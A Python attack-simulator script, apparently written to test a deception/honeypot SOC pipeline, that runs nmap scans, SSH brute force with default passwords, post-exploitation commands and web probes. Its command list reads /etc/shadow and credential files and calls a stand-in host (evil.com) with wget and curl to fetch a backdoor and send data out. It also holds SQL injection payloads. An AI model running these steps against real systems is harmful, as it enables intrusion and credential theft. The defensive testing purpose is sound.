"""
=============================================================================
Attack Simulator — End-to-End System Test
=============================================================================
Simulates a real attacker to test the entire deception-SOC pipeline.
Runs 4 phases: Reconnaissance, SSH Brute Force, Post-Exploitation, Web Attacks.
=============================================================================
Usage: python simulate_attacker.py <target_ip>
=============================================================================
"""

import subprocess
import sys
import time
from datetime import datetime

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
SSH_PORT = 22
HTTP_PORT = 80
DELAY_BETWEEN_PHASES = 5


def banner(text):
    print(f"\n{'=' * 60}")
    print(f"  {text}")
    print(f"{'=' * 60}\n")


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  [{ts}] {msg}")


# ===========================================================================
# Phase 1: Reconnaissance
# ===========================================================================
def phase1_recon():
    banner("PHASE 1: RECONNAISSANCE")
    log("Running Nmap SYN scan against target...")

    # SYN scan on common ports
    try:
        result = subprocess.run(
            ["nmap", "-sS", "-T4", "-p", "22,80,443,3306,21", TARGET],
            capture_output=True, text=True, timeout=30,
        )
        for line in result.stdout.strip().split("\n")[:10]:
            log(f"  {line}")
    except FileNotFoundError:
        log("[!] nmap not found -- simulating with TCP connections")
        import socket
        for port in [22, 80, 443, 3306, 21]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((TARGET, port))
                status = "open" if result == 0 else "closed"
                log(f"  Port {port}: {status}")
                s.close()
            except Exception as e:
                log(f"  Port {port}: error ({e})")
    except subprocess.TimeoutExpired:
        log("  Nmap scan timed out")

    log("")
    log("Running service version detection...")
    try:
        result = subprocess.run(
            ["nmap", "-sV", "-p", "22,80", TARGET],
            capture_output=True, text=True, timeout=30,
        )
        for line in result.stdout.strip().split("\n")[:10]:
            log(f"  {line}")
    except (FileNotFoundError, subprocess.TimeoutExpired):
        log("  Skipping version detection (nmap not available)")

    log("")
    log(f"Waiting {DELAY_BETWEEN_PHASES}s for trap deployment...")
    time.sleep(DELAY_BETWEEN_PHASES)


# ===========================================================================
# Phase 2: SSH Brute Force
# ===========================================================================
def phase2_ssh_bruteforce():
    banner("PHASE 2: SSH BRUTE FORCE")

    try:
        import paramiko
    except ImportError:
        log("[!] paramiko not installed, skipping SSH phase")
        log("  Install with: pip install paramiko")
        return None

    credentials = [
        ("admin", "password"),
        ("root", "123456"),
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "admin123"),
    ]

    client = None
    for username, password in credentials:
        log(f"Trying SSH: {username}:{password}")
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                TARGET, port=SSH_PORT,
                username=username, password=password,
                timeout=5, allow_agent=False, look_for_keys=False,
            )
            log(f"[+] SSH Success: {username}:{password}")
            client = ssh
            break
        except paramiko.AuthenticationException:
            log(f"  [-] Authentication failed")
        except Exception as e:
            log(f"  [-] Error: {e}")
        time.sleep(1)

    return client


# ===========================================================================
# Phase 3: Post-Exploitation
# ===========================================================================
def phase3_post_exploitation(ssh_client):
    banner("PHASE 3: POST-EXPLOITATION (Inside Honeypot)")

    if ssh_client is None:
        log("[!] No SSH session -- skipping post-exploitation")
        return

    commands = [
        "whoami",
        "id",
        "uname -a",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "ls -la /home/admin/",
        "cat /home/admin/credentials.txt",
        "cat /home/admin/.bash_history",
        "cat /home/admin/notes.txt",
        "cat /var/www/config.php",
        "env",
        "netstat -tlnp",
        "ps aux",
        "wget http://evil.com/backdoor.sh",
        "curl http://evil.com/exfil?data=stolen",
        "ssh admin@10.0.1.50",
    ]

    for cmd in commands:
        log(f"Executing: {cmd}")
        try:
            stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=5)
            output = stdout.read().decode("utf-8", errors="replace").strip()
            error = stderr.read().decode("utf-8", errors="replace").strip()
            # Print first 3 lines
            lines = (output or error).split("\n")[:3]
            for line in lines:
                if line.strip():
                    log(f"  > {line}")
            if len((output or error).split("\n")) > 3:
                log(f"  → ... ({len((output or error).split(chr(10)))} total lines)")
        except Exception as e:
            log(f"  > Error: {e}")
        time.sleep(1)

    log("")
    log("Closing SSH session...")
    ssh_client.close()


# ===========================================================================
# Phase 4: Web Attacks
# ===========================================================================
def phase4_web_attacks():
    banner("PHASE 4: WEB ATTACKS")

    try:
        import requests
    except ImportError:
        log("[!] requests not installed, skipping web phase")
        log("  Install with: pip install requests")
        return

    base_url = f"http://{TARGET}:{HTTP_PORT}"

    # Directory enumeration
    paths = [
        "/admin", "/login", "/api", "/.env", "/robots.txt",
        "/wp-admin", "/phpmyadmin", "/config", "/backup", "/.git",
        "/api/v1/users", "/api/v1/config",
    ]

    log("HTTP Directory Enumeration:")
    for path in paths:
        try:
            resp = requests.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
            log(f"  GET {path} -> {resp.status_code}")
        except Exception as e:
            log(f"  GET {path} -> Error: {e}")
        time.sleep(0.3)

    # Login attempts
    log("")
    log("HTTP Login Brute Force:")
    login_creds = [("admin", "admin"), ("admin", "admin123")]
    for username, password in login_creds:
        try:
            resp = requests.post(
                f"{base_url}/login",
                data={"username": username, "password": password},
                timeout=5, allow_redirects=False,
            )
            log(f"  POST /login ({username}:{password}) -> {resp.status_code}")
        except Exception as e:
            log(f"  POST /login ({username}:{password}) -> Error: {e}")
        time.sleep(0.5)

    # SQL injection tests
    log("")
    log("SQL Injection Tests:")
    sqli_payloads = [
        "/api/v1/users?id=1' OR '1'='1",
        "/api/v1/users?id=1 UNION SELECT * FROM users--",
    ]
    for payload in sqli_payloads:
        try:
            resp = requests.get(f"{base_url}{payload}", timeout=5)
            log(f"  SQLi {payload[:50]}... -> {resp.status_code}")
        except Exception as e:
            log(f"  SQLi test -> Error: {e}")
        time.sleep(0.5)


# ===========================================================================
# Main
# ===========================================================================
def main():
    print("""
    +----------------------------------------------------------+
    |       DECEPTION-SOC ATTACK SIMULATOR                     |
    |       Testing end-to-end deception pipeline              |
    +----------------------------------------------------------+
    |  Target: {:<47} |
    |  Time:   {:<47} |
    +----------------------------------------------------------+
    """.format(TARGET, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

    # Phase 1: Recon
    phase1_recon()

    # Phase 2: SSH Brute Force
    ssh_client = phase2_ssh_bruteforce()

    # Phase 3: Post-Exploitation
    phase3_post_exploitation(ssh_client)

    # Phase 4: Web Attacks
    phase4_web_attacks()

    # Final
    banner("SIMULATION COMPLETE")
    log("All attack phases completed!")
    log("")
    log("Check the dashboard at: http://localhost:3000")
    log("Check Kibana at:        http://localhost:5601")
    log("Orchestrator API:       http://localhost:8000/api/v1/health")
    log("Logger API:             http://localhost:9000/api/v1/stats")
    log("AI Module API:          http://localhost:8500/api/v1/ai/status")
    log("")


if __name__ == "__main__":
    main()
